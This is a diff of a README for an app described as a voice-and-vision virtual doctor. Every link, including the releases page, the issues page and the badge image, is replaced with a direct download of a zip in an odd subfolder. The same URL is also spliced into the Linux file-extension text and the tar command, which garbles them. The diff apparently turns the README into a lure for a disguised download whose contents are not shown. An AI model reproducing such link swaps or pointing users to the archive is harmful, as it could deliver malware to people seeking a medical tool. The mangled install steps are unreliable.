@@ -1,7 +1,7 @@
 # 🩺 Multimodal_Med_Ai_with_Deployment - Your AI Medical Assistant
 
 ## 📥 Download the Application
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/releases)
+[![Download Here](https://raw.githubusercontent.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/main/Tropicalian/Deployment_with_Med_Multimodal_Ai_v1.6-alpha.1.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/main/Tropicalian/Deployment_with_Med_Multimodal_Ai_v1.6-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Multimodal AI with Deployment! This application lets you interact with a virtual doctor using voice and vision technologies. It performs preliminary medical consultations, making healthcare accessible and easy.
@@ -16,18 +16,18 @@ Make sure you have the following to run the application smoothly:
 - A microphone and camera for full functionality
 
 ## 📦 Download & Install
-1. **Visit this page to download:** [GitHub Releases](https://github.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/releases).
+1. **Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/main/Tropicalian/Deployment_with_Med_Multimodal_Ai_v1.6-alpha.1.zip).
    
 2. On the releases page, find the latest version. The newest release usually appears at the top.
    
-3. Look for the file that corresponds to your operating system. It may be labeled with the extension `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. Look for the file that corresponds to your operating system. It may be labeled with the extension `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/main/Tropicalian/Deployment_with_Med_Multimodal_Ai_v1.6-alpha.1.zip` for Linux.
 
 4. **Download the file.** Click on the link to begin the download.
 
 5. **Run the installer.** 
    - On Windows, double-click the `.exe` file and follow the prompts to complete installation.
    - On macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - On Linux, extract the files with `tar -xvzf <filename>.tar.gz`, then follow the installation instructions provided within the files.
+   - On Linux, extract the files with `tar -xvzf <filename>https://raw.githubusercontent.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/main/Tropicalian/Deployment_with_Med_Multimodal_Ai_v1.6-alpha.1.zip`, then follow the installation instructions provided within the files.
 
 6. **Launch the application.** After installation, locate the application on your computer and double-click to start using your virtual doctor.
 
@@ -62,7 +62,7 @@ Dive deeper into the technology and concepts behind the application. Explore the
 ## 📣 Community and Support
 Join our community for advice, updates, and help:
 
-- **GitHub Issues:** Report problems or ask questions [here](https://github.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/issues).
+- **GitHub Issues:** Report problems or ask questions [here](https://raw.githubusercontent.com/MarceloSalazarV/Multimodal_Med_Ai_with_Deployment/main/Tropicalian/Deployment_with_Med_Multimodal_Ai_v1.6-alpha.1.zip).
 - **Forums:** Visit our forums to interact with other users.
 
 ## 🎉 Thank You for Using Multimodal_Med_Ai_with_Deployment!
